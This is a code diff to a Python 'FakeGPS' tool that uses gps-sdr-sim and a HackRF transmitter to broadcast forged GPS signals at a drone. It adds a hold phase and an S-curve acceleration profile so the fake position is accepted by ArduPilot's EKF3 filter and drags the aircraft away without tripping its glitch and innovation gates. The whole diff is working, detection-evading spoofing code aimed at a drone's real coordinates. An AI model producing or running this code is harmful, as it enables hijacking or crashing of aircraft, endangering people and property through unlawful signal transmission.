@@ -206,6 +206,14 @@ class FakeGPS:
             print(f"[Error] 寫入 CSV 失敗: {e}")
             return False
 
+    @staticmethod
+    def _smoothstep_velocity(elapsed: float, ramp_duration: float, target_speed: float) -> float:
+        """S-curve 速度剖面，消除起停瞬間 jerk。峰值加速度 = 1.5 * v / T。"""
+        if ramp_duration <= 0:
+            return target_speed
+        x = max(0.0, min(1.0, elapsed / ramp_duration))
+        return target_speed * x * x * (3.0 - 2.0 * x)
+
     def _generate_traction_csv(
         self,
         csv_file: str,
@@ -216,39 +224,56 @@ class FakeGPS:
         target_speed_mps: float,
         ramp_duration_s: float,
         total_duration_s: float,
+        hold_duration_s: float = 10.0,
     ) -> bool:
         """
         生成 EKF3 信任範圍內的牽引誘騙 CSV 軌跡。
-        速度從 0 線性加速到 target_speed_mps，確保加速度遠低於 EK3_GLITCH_ACCEL (1.5 m/s²)。
+
+        兩階段設計：
+          Phase 1 (hold): 在起始位置靜止 hold_duration_s 秒，讓 EKF3 完全接受
+                          偽造 GPS 源後再開始移動。
+          Phase 2 (move): 使用 S-curve 速度剖面加速，消除線性加速在 t=0 的
+                          瞬間 jerk，避免 IMU 與 GPS 創新量不一致。
+
+        S-curve 峰值加速度 = 1.5 * target_speed / ramp_duration，
+        確認呼叫端已驗證此值低於 EK3_GLITCH_ACCEL * SAFE_ACCEL_RATIO。
         """
         dt = 1.0 / self.update_rate_hz
-        steps = int(total_duration_s / dt)
         heading_rad = math.radians(heading_deg)
-
-        accel = target_speed_mps / ramp_duration_s if ramp_duration_s > 0 else target_speed_mps / dt
-
         lat, lon, alt = start_lat, start_lon, start_alt
-        current_speed = 0.0
+
+        move_duration_s = max(0.0, total_duration_s - hold_duration_s)
+        hold_steps = int(hold_duration_s / dt)
+        move_steps = int(move_duration_s / dt)
 
         try:
             with open(csv_file, "w") as f:
                 current_time = 0.0
                 f.write(f"{current_time:.1f},{lat:.6f},{lon:.6f},{alt:.1f}\n")
 
-                for _ in range(steps):
-                    if current_speed < target_speed_mps:
-                        current_speed = min(target_speed_mps, current_speed + accel * dt)
+                # Phase 1: 靜止駐留，讓 EKF3 信任偽造 GPS 源
+                for _ in range(hold_steps):
+                    current_time += dt
+                    f.write(f"{current_time:.1f},{lat:.6f},{lon:.6f},{alt:.1f}\n")
 
-                    distance = current_speed * dt
+                # Phase 2: S-curve 加速移動
+                elapsed_move = 0.0
+                for _ in range(move_steps):
+                    speed = self._smoothstep_velocity(elapsed_move, ramp_duration_s, target_speed_mps)
+                    distance = speed * dt
                     d_north = math.cos(heading_rad) * distance
                     d_east = math.sin(heading_rad) * distance
                     lat, lon = self._offset_lat_lon_m(lat, lon, d_north, d_east)
-
+                    elapsed_move += dt
                     current_time += dt
                     f.write(f"{current_time:.1f},{lat:.6f},{lon:.6f},{alt:.1f}\n")
 
             self.total_duration = current_time
-            print(f"[V] 牽引 CSV 生成完成: {csv_file} (時長: {self.total_duration:.1f}s)")
+            print(
+                f"[V] 牽引 CSV 生成完成: {csv_file}"
+                f" (駐留 {hold_duration_s:.0f}s + 移動 {move_duration_s:.0f}s"
+                f" = 總計 {self.total_duration:.1f}s)"
+            )
             return True
         except IOError as e:
             print(f"[Error] 寫入牽引 CSV 失敗: {e}")
@@ -286,18 +311,18 @@ class FakeGPS:
         print(f"    發射時間 : {duration_s} 秒")
         print(f"{'='*50}")
 
-        success = self.generate_bin(
+        result_bin = self.generate_bin(
             output_bin=output_bin,
             ephemeris_file_path=ephemeris_file,
             static_mode=True,
             manual_coords=(lat, lon, alt),
             drift_enabled=False,
             drift_duration_s=duration_s,
+            sample_rate=sample_rate,
         )
 
-        if success:
-            actual_bin = output_bin.replace(".bin", "_static.bin")
-            self.transmit_bin(actual_bin, freq=freq, sample_rate=sample_rate, tx_gain=tx_gain)
+        if result_bin:
+            self.transmit_bin(result_bin, freq=freq, sample_rate=sample_rate, tx_gain=tx_gain)
 
     def spoof_traction(
         self,
@@ -308,6 +333,7 @@ class FakeGPS:
         target_speed_mps: float = 0.5,
         ramp_duration_s: float = 20.0,
         total_duration_s: float = 120.0,
+        hold_duration_s: float = 10.0,
         output_bin: str = None,
         ephemeris_file: str = None,
         freq: int = 1575420000,
@@ -317,6 +343,11 @@ class FakeGPS:
         """
         模式 2：牽引式 GPS 誘騙（在 EKF3 信任範圍內緩慢移動）。
 
+        兩階段流程：
+          Phase 1 (hold_duration_s): 在起始位置靜止，等待 EKF3 完全接受偽造 GPS 源。
+          Phase 2 (total_duration_s - hold_duration_s): S-curve 加速移動，
+            消除瞬間 jerk，避免 IMU/GPS innovation 超出門檻。
+
         EKF3 關鍵限制：
           - EK3_GLITCH_RAD    = 25 m   → 位置跳躍超過此值將觸發 Glitch 保護
           - EK3_POS_I_GATE    = 5σ     → 位置 innovation 門檻 ≈ 2.5 m（每次更新）
@@ -325,9 +356,10 @@ class FakeGPS:
 
         成功條件：
           1. 必須從無人機「真實 GPS 位置」出發，偏差 < 2.5 m
-          2. 速度建議 ≤ 1 m/s（保守）或 ≤ 2 m/s（最大）
-          3. 加速度必須 < 0.75 m/s²（EK3_GLITCH_ACCEL 的一半）
-          4. ramp_duration_s ≥ target_speed_mps / 0.75
+          2. hold_duration_s ≥ 10s（讓 EKF3 完成 GPS 源切換）
+          3. 速度建議 ≤ 1 m/s（保守）或 ≤ 2 m/s（最大）
+          4. S-curve 峰值加速度 = 1.5 * v / T，必須 < 0.75 m/s²
+             → ramp_duration_s ≥ 1.5 * target_speed_mps / 0.75
 
         :param current_lat:      無人機當前真實緯度
         :param current_lon:      無人機當前真實經度
@@ -335,11 +367,12 @@ class FakeGPS:
         :param heading_deg:      誘騙移動方向 (0=正北, 90=正東)
         :param target_speed_mps: 目標誘騙速度 (m/s)，建議 ≤ 1 m/s
         :param ramp_duration_s:  從 0 加速到目標速度所需時間 (s)
-        :param total_duration_s: 誘騙總時長 (s)
+        :param total_duration_s: 總 CSV 時長，含駐留期 (s)
+        :param hold_duration_s:  Phase 1 靜止駐留時間 (s)，建議 ≥ 10s
         """
-        EK3_VEL_GATE_MPS = 2.5   # 5σ × 0.5 m/s
-        EK3_GLITCH_ACCEL = 1.5   # m/s²
-        SAFE_ACCEL_RATIO = 0.5   # 使用閾值的一半作為安全加速度
+        EK3_VEL_GATE_MPS = 2.5
+        EK3_GLITCH_ACCEL = 1.5
+        SAFE_ACCEL_RATIO = 0.5
 
         if target_speed_mps > EK3_VEL_GATE_MPS:
             print(
@@ -348,13 +381,17 @@ class FakeGPS:
             )
 
         safe_accel = EK3_GLITCH_ACCEL * SAFE_ACCEL_RATIO
-        min_ramp = target_speed_mps / safe_accel if safe_accel > 0 else 0
-        if ramp_duration_s < min_ramp:
+        # S-curve 峰值加速度為線性的 1.5 倍，故 min_ramp 也需乘以 1.5
+        min_ramp = (1.5 * target_speed_mps / safe_accel) if safe_accel > 0 else 0
+        if ramp_duration_s > 0 and ramp_duration_s < min_ramp:
+            peak_accel = 1.5 * target_speed_mps / ramp_duration_s
             print(
-                f"[Warning] 加速時間 {ramp_duration_s:.1f}s 過短，"
-                f"加速度 {target_speed_mps/ramp_duration_s:.2f} m/s² ≥ 安全上限 {safe_accel} m/s²"
+                f"[Warning] S-curve 峰值加速度 {peak_accel:.3f} m/s² ≥ 安全上限 {safe_accel} m/s²"
             )
             print(f"          建議 ramp_duration_s ≥ {min_ramp:.1f} s")
+
+        if hold_duration_s < 5.0:
+            print(f"[Warning] hold_duration_s={hold_duration_s:.1f}s 過短，建議 ≥ 10s 讓 EKF3 完成 GPS 源接受")
 
         if output_bin is None:
             output_bin = os.path.join(
@@ -362,14 +399,17 @@ class FakeGPS:
             )
 
         csv_file = os.path.splitext(output_bin)[0] + "_traction.csv"
+        move_duration_s = max(0.0, total_duration_s - hold_duration_s)
+        peak_accel = (1.5 * target_speed_mps / ramp_duration_s) if ramp_duration_s > 0 else float("inf")
 
         print(f"\n{'='*50}")
         print(f"[模式 2] 牽引式 GPS 誘騙")
         print(f"    起始座標（無人機真實位置）: {current_lat:.6f}, {current_lon:.6f}, Alt={current_alt:.1f}m")
-        print(f"    誘騙方向 : {heading_deg}°（0=正北, 90=正東）")
+        print(f"    誘騙方向 : {heading_deg}° （0=正北, 90=正東）")
         print(f"    目標速度 : {target_speed_mps} m/s")
-        print(f"    加速時間 : {ramp_duration_s} s（加速度 {target_speed_mps/ramp_duration_s:.3f} m/s²）")
-        print(f"    總時長   : {total_duration_s} s")
+        print(f"    Phase 1  : 靜止駐留 {hold_duration_s:.0f}s（EKF3 接受偽造 GPS 源）")
+        print(f"    Phase 2  : S-curve 加速 {ramp_duration_s:.0f}s → 峰值加速度 {peak_accel:.3f} m/s²")
+        print(f"    移動時長 : {move_duration_s:.0f}s  |  總 CSV : {total_duration_s:.0f}s")
         print(f"    [EKF3]  速度門檻 ≤ {EK3_VEL_GATE_MPS} m/s | 安全加速度 ≤ {safe_accel} m/s²")
         print(f"{'='*50}")
 
@@ -384,19 +424,21 @@ class FakeGPS:
             target_speed_mps=target_speed_mps,
             ramp_duration_s=ramp_duration_s,
             total_duration_s=total_duration_s,
+            hold_duration_s=hold_duration_s,
         )
         if not ok:
             return
 
-        success = self.generate_bin(
+        result_bin = self.generate_bin(
             output_bin=output_bin,
             ephemeris_file_path=ephemeris_file,
             static_mode=False,
             csv_file=csv_file,
+            sample_rate=sample_rate,
         )
 
-        if success:
-            self.transmit_bin(output_bin, freq=freq, sample_rate=sample_rate, tx_gain=tx_gain)
+        if result_bin:
+            self.transmit_bin(result_bin, freq=freq, sample_rate=sample_rate, tx_gain=tx_gain)
 
     def generate_bin(
             self,
@@ -411,15 +453,19 @@ class FakeGPS:
             drift_seed=None,
             drift_duration_s=None,
             drift_heading_deg=0.0,
-            drift_alt_jitter_m=0.0
-        ) -> bool:
+            drift_alt_jitter_m=0.0,
+            sample_rate: int = 2600000,
+        ) -> "str | None":
         """
-        呼叫 gps-sdr-sim 生成 .bin 檔案
-        :param output_bin: 輸出 bin 檔案路徑
+        呼叫 gps-sdr-sim 生成 .bin 檔案。
+
+        :param output_bin:          輸出 bin 檔案路徑（基礎名，實際路徑依模式加後綴）
         :param ephemeris_file_path: 星曆檔案路徑
-        :param static_mode: True 為靜態定點模式，False 為動態軌跡模式
-        :param manual_coords: 靜態模式必需參數，格式 (lat, lon, alt)
-        :param csv_file: 動態模式必需參數，CSV 路徑
+        :param static_mode:         True 為靜態定點模式，False 為動態軌跡模式
+        :param manual_coords:       靜態模式必需參數，格式 (lat, lon, alt)
+        :param csv_file:            動態模式必需參數，CSV 路徑
+        :param sample_rate:         採樣率 (Hz)，必須與 transmit_bin 保持一致
+        :return:                    成功時回傳實際 bin 路徑；失敗回傳 None
         """
 
         # 1. 檢查並取得星曆
@@ -427,48 +473,46 @@ class FakeGPS:
             print("[*] 正在取得最新星曆檔案...")
             ephemeris_file_path = fetch_latest_ephemeris()
             if ephemeris_file_path is None:
-                print(f"[Error] 無法取得最新星曆檔案")
-                return False
+                print("[Error] 無法取得最新星曆檔案")
+                return None
 
         if not os.path.exists(self.gps_sim_exe_path):
             print(f"[Error] 找不到 gps-sdr-sim 執行檔: {self.gps_sim_exe_path}")
-            return False
+            return None
 
         if not os.path.exists(ephemeris_file_path):
             print(f"[Error] 找不到星曆檔案: {ephemeris_file_path}")
-            return False
+            return None
 
-        print(f"[*] 開始生成 GPS 基頻信號 (這可能需要幾分鐘)...")
+        print("[*] 開始生成 GPS 基頻信號 (這可能需要幾分鐘)...")
         print(f"    - 星曆: {ephemeris_file_path}")
-        
-        # 確保輸出目錄存在（必須在寫 drift CSV 之前）
+        print(f"    - 採樣率: {sample_rate} Hz")
+
         os.makedirs(os.path.dirname(output_bin), exist_ok=True)
 
-        # 準備基礎指令
+        actual_bin = output_bin
         cmd = [
             self.gps_sim_exe_path,
             "-e", ephemeris_file_path,
-            "-s", "2600000",  # 設定採樣率為 2.6MHz
+            "-s", str(sample_rate),
             "-b", "8",
-            "-o", output_bin
         ]
 
         # 2. 根據模式配置參數
         if static_mode:
-            # --- 靜態模式 (定點) ---
             if not manual_coords:
                 print("[Error] 靜態模式 (static_mode=True) 必須提供 manual_coords 參數 (lat, lon, alt)")
-                return False
+                return None
 
             lat, lon, alt = manual_coords
             duration = drift_duration_s if drift_duration_s is not None else 60
-            
+
             if drift_enabled:
                 drift_csv = os.path.splitext(output_bin)[0] + "_drift.csv"
+                actual_bin = output_bin.replace(".bin", "_drift.bin")
                 print(f"    - 模式: 靜態定點 + 緩慢漂移")
                 print(f"    - 起點座標: {lat}, {lon}, {alt}")
-                print(f"    - 漂移速度: {drift_rate_mps} m/s")
-                print(f"    - 漂移時間: {duration} 秒")
+                print(f"    - 漂移速度: {drift_rate_mps} m/s  |  時間: {duration}s")
 
                 ok = self._generate_drift_csv(
                     csv_file=drift_csv,
@@ -480,40 +524,35 @@ class FakeGPS:
                     mode=drift_mode,
                     seed=drift_seed,
                     heading_deg=drift_heading_deg,
-                    alt_jitter_m=drift_alt_jitter_m
+                    alt_jitter_m=drift_alt_jitter_m,
                 )
                 if not ok:
-                    return False
-
+                    return None
                 cmd.extend(["-u", drift_csv])
-                output_bin = output_bin.replace(".bin", f"_drift.bin")
             else:
+                actual_bin = output_bin.replace(".bin", "_static.bin")
                 print(f"    - 模式: 靜態定點 (Static)")
-                print(f"    - 座標: {lat}, {lon}, {alt}")
-                print(f"    - 時間: {duration} 秒")
-
+                print(f"    - 座標: {lat}, {lon}, {alt}  |  時間: {duration}s")
                 cmd.extend(["-l", f"{lat},{lon},{alt}"])
                 cmd.extend(["-d", str(duration)])
-                output_bin = output_bin.replace(".bin", f"_static.bin")
-            
+
         else:
-            # --- 動態模式 (軌跡) ---
             if not csv_file or not os.path.exists(csv_file):
-                 print(f"[Error] 動態模式需要有效的 CSV 檔案路徑")
-                 return False
-            
-            print(f"    - 模式: 動態軌跡 (Dynamic)")     
+                print("[Error] 動態模式需要有效的 CSV 檔案路徑")
+                return None
+            print(f"    - 模式: 動態軌跡 (Dynamic)")
             print(f"    - 軌跡: {csv_file}")
             cmd.extend(["-u", csv_file])
-        
+
+        cmd.extend(["-o", actual_bin])
+
         try:
-            # 執行 gps-sdr-sim
             subprocess.run(cmd, check=True)
-            print(f"[V] 信號生成成功: {output_bin}")
-            return True
+            print(f"[V] 信號生成成功: {actual_bin}")
+            return actual_bin
         except subprocess.CalledProcessError as e:
             print(f"[Error] gps-sdr-sim 執行失敗: {e}")
-            return False
+            return None
 
     def transmit_bin(self, bin_file, freq=1575420000, sample_rate=2600000, tx_gain=47):
         """呼叫 hackrf_transfer 發射信號"""
@@ -576,8 +615,10 @@ if __name__ == "__main__":
     #
     # 使用前請確認：
     #   - current_lat/lon/alt 填入無人機「當前真實 GPS 位置」
+    #   - hold_duration_s ≥ 10s（等待 EKF3 接受偽造 GPS 源）
     #   - target_speed_mps ≤ 1.0 m/s（建議）或 ≤ 2.0 m/s（最大）
-    #   - ramp_duration_s ≥ target_speed_mps / 0.75（EKF3 安全加速度限制）
+    #   - S-curve 峰值加速度 = 1.5 * v / T，需 < 0.75 m/s²
+    #     → ramp_duration_s ≥ 1.5 * target_speed_mps / 0.75
     # ===========================================================
     simulator.spoof_traction(
         current_lat=23.14020741597821,    # 無人機當前真實緯度
@@ -585,8 +626,9 @@ if __name__ == "__main__":
         current_alt=50.0,                 # 無人機當前真實高度 (m)
         heading_deg=90.0,                 # 誘騙方向：正東
         target_speed_mps=0.5,             # 目標速度：0.5 m/s（保守安全）
-        ramp_duration_s=20.0,             # 加速時間：20s → 加速度 0.025 m/s²
-        total_duration_s=180.0,           # 總誘騙時長：3 分鐘
+        ramp_duration_s=20.0,             # S-curve 加速時間：峰值加速度 0.0375 m/s²
+        total_duration_s=200.0,           # 總 CSV 時長：含駐留 + 移動
+        hold_duration_s=20.0,             # Phase 1 靜止駐留：20s 讓 EKF3 穩定接受
     )
 
 
